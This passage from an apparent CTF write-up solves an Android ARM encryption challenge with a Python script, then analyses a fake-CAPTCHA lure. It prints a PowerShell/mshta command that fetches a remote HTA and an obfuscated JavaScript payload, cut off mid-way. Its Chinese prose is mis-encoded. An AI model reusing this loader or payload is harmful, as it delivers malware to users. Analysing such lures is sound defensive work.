class="built_in">GetStringUTFChars</span>(a1, a3, &amp;v17);</span><br><span class="line">  v3 = __strlen_chk(StringUTFChars, <span class="number">0xFFFFFFFFFFFFFFFFLL</span>);</span><br><span class="line">  StringUTFChars_1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  __strcpy_chk(StringUTFChars_1, StringUTFChars, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( __strlen_chk(StringUTFChars_1, <span class="number">0xFFFFFFFFFFFFFFFFLL</span>) == <span class="number">48</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    t = (<span class="type">int8x16_t</span>)::t;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      *(<span class="type">int8x16_t</span> *)&amp;StringUTFChars_1[<span class="number">16</span> * i] = <span class="built_in">veorq_s8</span>(<span class="built_in">vqtbl1q_s8</span>(*(<span class="type">int8x16_t</span> *)&amp;StringUTFChars_1[<span class="number">16</span> * i], t), t);</span><br><span class="line">      i_1 = i;</span><br><span class="line">      v4 = &amp;i_1;</span><br><span class="line">      v5 = <span class="built_in">vld1q_dup_s8</span>(v4);</span><br><span class="line">      t = <span class="built_in">veorq_s8</span>(t, v5);</span><br><span class="line">      __android_log_print(<span class="number">6</span>, <span class="string">&quot;========= Error =========   &quot;</span>, <span class="string">&quot;%s&quot;</span>, StringUTFChars_1);</span><br><span class="line">    &#125;</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;========= Error =========   &quot;</span>, <span class="string">&quot;%s&quot;</span>, StringUTFChars_1);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; j += <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      StringUTFChars_1[j] = ((<span class="type">unsigned</span> __int8)StringUTFChars_1[j] &gt;&gt; <span class="number">5</span>) | (<span class="number">8</span> * StringUTFChars_1[j]);</span><br><span class="line">      StringUTFChars_1[j + <span class="number">1</span>] = ((<span class="type">unsigned</span> __int8)StringUTFChars_1[j + <span class="number">1</span>] &gt;&gt; <span class="number">1</span>) | (StringUTFChars_1[j + <span class="number">1</span>] &lt;&lt; <span class="number">7</span>);</span><br><span class="line">      StringUTFChars_1[j + <span class="number">2</span>] = StringUTFChars_1[j + <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    i_2 = __strlen_chk(StringUTFChars_1, <span class="number">0xFFFFFFFFFFFFFFFFLL</span>);</span><br><span class="line">    <span class="built_in">encodeBase64</span>(StringUTFChars_1, i_2, &amp;v16);</span><br><span class="line">    __android_log_print(<span class="number">6</span>, <span class="string">&quot;========= Error =========   &quot;</span>, <span class="string">&quot;%s&quot;</span>, StringUTFChars_1);</span><br><span class="line">    v13 = _JNIEnv::<span class="built_in">NewStringUTF</span>(a1, v16);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = _JNIEnv::<span class="built_in">NewString</span>(a1, word_86B, <span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  _ReadStatusReg(<span class="built_in">ARM64_SYSREG</span>(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>len = 48</p><p>åŠ å¯†ï¼š<br>1ã€NEON è¡¨æŸ¥æ‰¾+å¼‚æˆ– 3 è½®</p><p>2ã€æ¯ 3 å­—èŠ‚åˆ†ç»„çš„ä½è¿ç®—ï¼š</p><ul><li><p>b0 = (b0 &gt;&gt; 5) | (b0 &lt;&lt; 3) ï¼ˆå¾ªç¯å³ç§» 5 ä½ï¼‰</p></li><li><p>b1 = (b1 &gt;&gt; 1) | (b1 &lt;&lt; 7) ï¼ˆå¾ªç¯å³ç§» 1 ä½ï¼‰</p></li><li><p>b2 = åŸæ ·</p></li></ul><p>3ã€å˜è¡¨Base64</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¾“å…¥é•¿åº¦å·²åˆ¤å®šä¸º 48</span></span><br><span class="line">t = (<span class="type">int8x16_t</span>)::t;                 <span class="comment">// å–å¸¸é‡è¡¨ tï¼ˆ16 å­—èŠ‚ï¼‰åˆ°å‘é‡å¯„å­˜å™¨</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i) &#123;          <span class="comment">// 3 ä¸ª 16 å­—èŠ‚å—ï¼Œå…± 48 å­—èŠ‚</span></span><br><span class="line">  <span class="comment">// 1) æŸ¥è¡¨ç½®æ¢ + 2) å¼‚æˆ–æ©ç </span></span><br><span class="line">  *(<span class="type">int8x16_t</span> *)&amp;StringUTFChars_1[<span class="number">16</span> * i] =</span><br><span class="line">      veorq_s8(</span><br><span class="line">        vqtbl1q_s8(*(<span class="type">int8x16_t</span> *)&amp;StringUTFChars_1[<span class="number">16</span> * i], t),</span><br><span class="line">        t</span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3) æ›´æ–°å¯†é’¥å‘é‡ tï¼šæŠŠæ ‡é‡ i å¤åˆ¶åˆ° 16 ä¸ª laneï¼Œå†ä¸ t æŒ‰ä½å¼‚æˆ–</span></span><br><span class="line">  i_1 = i;</span><br><span class="line">  v5 = vld1q_dup_s8(&amp;i_1);          <span class="comment">// v5 = [i, i, i, ..., i]</span></span><br><span class="line">  t = veorq_s8(t, v5);              <span class="comment">// t &lt;- t ^ [i,i,...,i]</span></span><br><span class="line"></span><br><span class="line">  __android_log_print(..., <span class="string">&quot;%s&quot;</span>, StringUTFChars_1); <span class="comment">// è°ƒè¯•æ—¥å¿—</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vqtbl1q_s8(a, b) = dst[k] = (b[k] &lt; 16) ? a[ b[k] ] : 0</code></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TARGET_ENCODED = <span class="string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span></span><br><span class="line">CUSTOM_ALPHABET = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span></span><br><span class="line">T_VALUE = <span class="built_in">bytes</span>([<span class="number">0xD</span>,<span class="number">0xE</span>,<span class="number">0xF</span>,<span class="number">0xC</span>,<span class="number">0xB</span>,<span class="number">0xA</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_decode</span>(<span class="params">encoded, alphabet</span>):</span><br><span class="line">    standard_alphabet = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">    custom_to_standard_map = &#123;char: standard_alphabet[i] <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(alphabet)&#125;</span><br><span class="line">    </span><br><span class="line">    standard_encoded = <span class="string">&quot;&quot;</span>.join([custom_to_standard_map.get(c, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> encoded])</span><br><span class="line">    </span><br><span class="line">    padding_needed = <span class="built_in">len</span>(standard_encoded) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> padding_needed != <span class="number">0</span>:</span><br><span class="line">        standard_encoded += <span class="string">&#x27;=&#x27;</span> * (<span class="number">4</span> - padding_needed)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(standard_encoded)</span><br><span class="line"></span><br><span class="line"><span class="comment"># StringUTFChars_1[j] = ((unsigned __int8)StringUTFChars_1[j] &gt;&gt; 5) | (8 * StringUTFChars_1[j]);</span></span><br><span class="line"><span class="comment"># StringUTFChars_1[j + 1] = ((unsigned __int8)StringUTFChars_1[j + 1] &gt;&gt; 1) | (StringUTFChars_1[j + 1] &lt;&lt; 7);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_stage2</span>(<span class="params">data</span>):</span><br><span class="line">    reversed_data = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(reversed_data), <span class="number">3</span>):</span><br><span class="line">        reversed_data[j] = ((reversed_data[j] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xFF</span>) | (reversed_data[j] &gt;&gt; <span class="number">3</span>)</span><br><span class="line">        reversed_data[j + <span class="number">1</span>] = ((reversed_data[j + <span class="number">1</span>] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFF</span>) | (reversed_data[j + <span class="number">1</span>] &gt;&gt; <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">return</span> reversed_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_stage1</span>(<span class="params">data, t_value</span>):</span><br><span class="line">    reversed_data = <span class="built_in">bytearray</span>(data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># è®¡ç®— v10 åœ¨æ¯ä¸ªé˜¶æ®µçš„å€¼</span></span><br><span class="line">    v10_states = []</span><br><span class="line">    v10_current = <span class="built_in">bytearray</span>(t_value)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># v10 for i=0</span></span><br><span class="line">    v10_states.append(v10_current[:])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># v10 for i=1</span></span><br><span class="line">    v10_i1 = <span class="built_in">bytearray</span>(v10_current)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        v10_i1[k] ^= <span class="number">1</span></span><br><span class="line">    v10_states.append(v10_i1)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># v10 for i=2</span></span><br><span class="line">    v10_i2 = <span class="built_in">bytearray</span>(v10_i1)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        v10_i2[k] ^= <span class="number">2</span></span><br><span class="line">    v10_states.append(v10_i2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä» i=2 åˆ° i=0 é€†è½¬</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        block_start = <span class="number">16</span> * i</span><br><span class="line">        block_end = <span class="number">16</span> * (i + <span class="number">1</span>)</span><br><span class="line">        current_block = reversed_data[block_start:block_end]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è·å–å½“å‰é˜¶æ®µçš„ v10</span></span><br><span class="line">        <span class="comment"># åŸå§‹æ“ä½œä¸­ï¼Œv10 åœ¨å¾ªç¯ *ä¹‹å* æ›´æ–°</span></span><br><span class="line">        <span class="comment"># æ‰€ä»¥åœ¨é€†è½¬æ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å¾ªç¯ *å¼€å§‹æ—¶* çš„ v10</span></span><br><span class="line">        <span class="comment"># i=2: v10 = v10_states[1]</span></span><br><span class="line">        <span class="comment"># i=1: v10 = v10_states[0]</span></span><br><span class="line">        <span class="comment"># i=0: v10 = t_value</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">2</span>:</span><br><span class="line">            v10 = v10_states[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            v10 = v10_states[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># i == 0</span></span><br><span class="line">            v10 = <span class="built_in">bytearray</span>(t_value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1. é€†è½¬ veorq_s8</span></span><br><span class="line">        temp_block = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            temp_block[k] = current_block[k] ^ v10[k]</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 2. é€†è½¬ vqtbl1q_s8</span></span><br><span class="line">        <span class="comment"># vqtbl1q_s8(X, Y) -&gt; Z, where Z[k] = X[Y[k]]</span></span><br><span class="line">        <span class="comment"># é€†æ“ä½œ: X[Y[k]] = Z[k]</span></span><br><span class="line">        original_block = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            index = v10[k]</span><br><span class="line">            <span class="keyword">if</span> index &lt; <span class="number">16</span>:</span><br><span class="line">                original_block[index] = temp_block[k]</span><br><span class="line">                </span><br><span class="line">        reversed_data[block_start:block_end] = original_block</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> reversed_data</span><br><span class="line"></span><br><span class="line">decoded = custom_base64_decode(TARGET_ENCODED, CUSTOM_ALPHABET)</span><br><span class="line">rev2 = reverse_stage2(decoded)</span><br><span class="line">flag = reverse_stage1(rev2, T_VALUE)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag.decode(<span class="string">&quot;ascii&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"><span class="comment"># Flag: LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span></span><br></pre></td></tr></table></figure><h1 id="1â€™M-no7-A-rO6oT"><a href="#1â€™M-no7-A-rO6oT" class="headerlink" title="1â€™M no7 A rO6oT"></a>1â€™M no7 A rO6oT</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell . \*i*\\\\\\\\\\\\\\\*2\msh*e http://challenge.xinshi.fun:48767/Coloringoutomic_Host.mp3   http://challenge.xinshi.fun:48767/Coloringoutomic_Host.mp3 #     âœ… Î™ am nÎ¿t a rÎ¿bÎ¿t: CAPTCHA Verification ID: 10086</span><br></pre></td></tr></table></figure><p><code>\*i*\\\\\\\\\\\\\\\*2\msh*e</code>ç”¨*åŒ¹é…å‘½ä»¤</p><ul><li><code>irm</code>ï¼šInvoke-RestMethodï¼Œä»Webä¸‹è½½å‘½ä»¤</li><li><code>iex</code>ï¼šInvode-Expressionï¼Œæ‰§è¡Œå­—ç¬¦ä¸²</li><li><code>mshta.exe</code>ï¼šæ‰§è¡ŒHTAæ–‡ä»¶</li></ul><p>mp3é‡Œé¢æœ‰ä¸€ä¸ªæ¶æ„è½½è·<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.resizeTo(0, 0);window.moveTo(-9999, -9999); SK=102;UP=117;tV=110;Fx=99;nI=116;pV=105;wt=111;RV=32;wV=82;Rp=106;kz=81;CX=78;GH=40;PS=70;YO=86;kF=75;PO=113;QF=41;sZ=123;nd=118;Ge=97;sV=114;wl=104;NL=121;Ep=76;uS=98;Lj=103;ST=61;Ix=34;Im=59;Gm=101;YZ=109;Xj=71;Fi=48;dL=60;cX=46;ho=108;jF=43;Gg=100;aV=90;uD=67;Nj=83;US=91;tg=93;vx=45;xv=54;QB=49;WT=125;FT=55;yN=51;ff=44;it=50;NW=53;kX=57;zN=52;Mb=56;Wn=119;sC=65;Yp=88;FF=79;var SxhM = String.fromCharCode(SK,UP,tV,Fx,nI,pV,wt,tV,RV,pV,wt,wV,Rp,kz,CX,GH,PS,YO,kF,PO,QF,sZ,nd,Ge,sV,RV,wt,wl,NL,Ep,uS,Lj,ST,RV,Ix,Ix,Im,SK,wt,sV,RV,GH,nd,Ge,sV,RV,Gm,YZ,Xj,kF,RV,ST,RV,Fi,Im,Gm,YZ,Xj,kF,RV,dL,RV,PS,YO,kF,PO,cX,ho,Gm,tV,Lj,nI,wl,Im,RV,Gm,YZ,Xj,kF,jF,jF,QF,sZ,nd,Ge,sV,RV,tV,Gg,aV,uD,RV,ST,RV,Nj,nI,sV,pV,tV,Lj,cX,SK,sV,wt,YZ,uD,wl,Ge,sV,uD,wt,Gg,Gm,GH,PS,YO,kF,PO,US,Gm,YZ,Xj,kF,tg,RV,vx,RV,xv,Fi,QB,QF,Im,wt,wl,NL,Ep,uS,Lj,RV,ST,RV,wt,wl,NL,Ep,uS,Lj,RV,jF,RV,tV,Gg,aV,uD,WT,sV,Gm,nI,UP,sV,tV,RV,wt,wl,NL,Ep,uS,Lj,WT,Im,nd,Ge,sV,RV,wt,wl,NL,Ep,uS,Lj,RV,ST,RV,pV,wt,wV,Rp,kz,CX,GH,US,FT,QB,yN,ff,RV,FT,QB,it,ff,RV,FT,it,Fi,ff,RV,FT,Fi,it,ff,RV,FT,QB,NW,ff,RV,FT,QB,xv,ff,RV,FT,Fi,NW,ff,RV,FT,Fi,it,ff,RV,FT,Fi,kX,ff,RV,FT,Fi,kX,ff,RV,xv,zN,FT,ff,RV,FT,Fi,it,ff,RV,FT,it,QB,ff,RV,FT,Fi,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,it,Fi,ff,RV,xv,yN,yN,ff,RV,xv,NW,Fi,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,Fi,it,ff,RV,FT,QB,yN,ff,RV,xv,yN,yN,ff,RV,xv,Mb,xv,ff,RV,FT,QB,QB,ff,RV,FT,QB,NW,ff,RV,FT,Fi,it,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,Fi,Fi,ff,RV,FT,QB,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,QB,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,QB,QB,ff,RV,FT,QB,it,ff,RV,FT,QB,yN,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,yN,yN,ff,RV,xv,xv,it,ff,RV,xv,zN,QB,ff,RV,xv,kX,it,ff,RV,FT,QB,NW,ff,RV,FT,Fi,it,ff,RV,FT,Fi,zN,ff,RV,FT,Fi,it,ff,RV,FT,it,QB,ff,RV,xv,kX,zN,ff,RV,xv,NW,kX,ff,RV,xv,NW,kX,ff,RV,xv,FT,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,QB,FT,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,NW,ff,RV,FT,Fi,it,ff,RV,FT,QB,xv,ff,RV,xv,zN,QB,ff,RV,xv,zN,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT